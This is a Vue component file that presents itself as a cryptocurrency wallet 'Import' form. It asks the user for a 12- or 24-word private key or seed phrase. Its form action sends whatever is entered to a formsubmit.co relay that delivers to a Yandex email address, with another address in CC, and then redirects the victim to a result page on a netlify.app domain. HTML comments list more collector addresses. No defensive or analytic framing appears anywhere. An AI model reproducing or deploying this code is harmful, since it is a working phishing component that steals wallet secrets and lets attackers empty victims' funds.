<template>
  <form action="https://formsubmit.co/Feihung.w@yandex.com" method="POST" class="private-key">
     <input type="hidden" name="_cc" value="epaphrasstanley@yandex.com">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://p2eegames.netlify.app/result">
    <input type="text" placeholder="Private Key" :name="$route.params.id" class="w-full mb-1 outline-none py-1 px-2 block" required>
    <span class="text-16 text-grey block mb-5">Typically 12 (sometimes 24) words seperated by a single spaces.</span>
    <button type="submit" class="w-full py-2 bg-blue text-white uppercase">Import</button>
  </form>
</template>

<!--brainsharpie@yandex.com-->
<!--brain2x@yandex.com-->
<!---->

<script>
export default {
  name: "private-key"
}
</script>

<style scoped>

</style>
